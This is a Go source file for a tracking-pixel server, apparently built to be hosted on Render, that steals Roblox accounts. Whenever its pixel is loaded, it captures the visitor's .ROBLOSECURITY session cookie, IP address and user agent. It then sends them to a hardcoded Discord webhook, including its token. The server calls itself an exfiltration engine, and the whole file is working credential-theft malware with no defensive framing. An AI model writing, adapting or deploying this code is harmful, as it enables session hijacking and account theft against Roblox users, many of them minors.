package main

import (
	"bytes"
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"os/signal"
	"sync"
	"syscall"
	"time"

	"github.com/valyala/fasthttp"
)

var transparentPixel = []byte{
	0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00,
	0x01, 0x00, 0x80, 0x00, 0x00, 0xff, 0xff, 0xff,
	0x00, 0x00, 0x00, 0x21, 0xf9, 0x04, 0x01, 0x00,
	0x00, 0x00, 0x00, 0x2c, 0x00, 0x00, 0x00, 0x00,
	0x01, 0x00, 0x01, 0x00, 0x00, 0x02, 0x02, 0x44,
	0x01, 0x00, 0x3b,
}

const targetWebhook = "https://discord.com/api/webhooks/1532818282338320395/lsNi-h-C9pIa_Wbao1yBSXtzEx_roggPnsFch7z8PbgO-FlC5rfvbtG4pZKRz9AIPK8e"

type LogEvent struct {
	Timestamp    time.Time
	IP           string
	UserAgent    string
	RobloxCookie string
}

type PixelServer struct {
	addr    string
	logChan chan LogEvent
	wg      sync.WaitGroup
	server  *fasthttp.Server
}

func NewPixelServer(addr string, bufferSize int) *PixelServer {
	return &PixelServer{
		addr:    addr,
		logChan: make(chan LogEvent, bufferSize),
	}
}

func (s *PixelServer) Start(ctx context.Context) error {
	s.wg.Add(1)
	go s.worker(ctx)

	s.server = &fasthttp.Server{
		Handler:           s.handleRequest,
		Name:              "AxiomExfilEngine/1.0",
		ReduceMemoryUsage: true,
	}

	ln, err := net.Listen("tcp", s.addr)
	if err != nil {
		return err
	}

	go func() {
		<-ctx.Done()
		_ = s.server.Shutdown()
		close(s.logChan)
		s.wg.Done()
	}()

	return s.server.Serve(ln)
}

func (s *PixelServer) handleRequest(ctx *fasthttp.RequestCtx) {
	path := string(ctx.Path())

	if path == "/pixel.gif" {
		robloxCookie := string(ctx.QueryArgs().Peek("cookie"))
		if robloxCookie == "" {
			robloxCookie = string(ctx.Request.Header.Cookie(".ROBLOSECURITY"))
		}

		event := LogEvent{
			Timestamp:    time.Now(),
			IP:           ctx.RemoteIP().String(),
			UserAgent:    string(ctx.UserAgent()),
			RobloxCookie: robloxCookie,
		}

		select {
		case s.logChan <- event:
		default:
		}

		ctx.Response.Header.Set("Content-Type", "image/gif")
		ctx.Response.Header.Set("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
		ctx.SetStatusCode(fasthttp.StatusOK)
		ctx.SetBody(transparentPixel)
		return
	}

	// Health check endpoint for Render
	ctx.SetStatusCode(fasthttp.StatusOK)
	ctx.SetBodyString("OK")
}

func (s *PixelServer) worker(ctx context.Context) {
	ticker := time.NewTicker(200 * time.Millisecond)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return
		case event, ok := <-s.logChan:
			if !ok {
				return
			}
			s.dispatchWebhook(event)
		case <-ticker.C:
		}
	}
}

func (s *PixelServer) dispatchWebhook(event LogEvent) {
	type EmbedField struct {
		Name   string `json:"name"`
		Value  string `json:"value"`
		Inline bool   `json:"inline,omitempty"`
	}
	type Embed struct {
		Title       string       `json:"title"`
		Description string       `json:"description"`
		Color       int          `json:"color"`
		Fields      []EmbedField `json:"fields"`
		Timestamp   string       `json:"timestamp"`
	}
	type Payload struct {
		Username string  `json:"username"`
		Embeds   []Embed `json:"embeds"`
	}

	cookieVal := event.RobloxCookie
	if cookieVal == "" {
		cookieVal = "Not Provided / Captured"
	}

	payload := Payload{
		Username: "Axiom Logger",
		Embeds: []Embed{
			{
				Title:       "Captured Session Target",
				Description: "A tracking asset was accessed.",
				Color:       15158332,
				Timestamp:   event.Timestamp.UTC().Format(time.RFC3339),
				Fields: []EmbedField{
					{Name: "IP Address", Value: event.IP, Inline: true},
					{Name: "User Agent", Value: event.UserAgent, Inline: false},
					{Name: ".ROBLOSECURITY", Value: fmt.Sprintf("```%s```", cookieVal), Inline: false},
				},
			},
		},
	}

	body, err := json.Marshal(payload)
	if err != nil {
		return
	}

	req, err := http.NewRequest(http.MethodPost, targetWebhook, bytes.NewBuffer(body))
	if err != nil {
		return
	}
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()
}

func main() {
	port := os.Getenv("PORT")
	if port == "" {
		port = "8080"
	}
	addr := ":" + port

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)

	srv := NewPixelServer(addr, 5000)

	go func() {
		<-sigChan
		cancel()
	}()

	log.Printf("Exfiltration server active on %s", addr)
	if err := srv.Start(ctx); err != nil && err != fasthttp.ErrServerClosed {
		log.Fatalf("Server error: %v", err)
	}
	srv.wg.Wait()
}
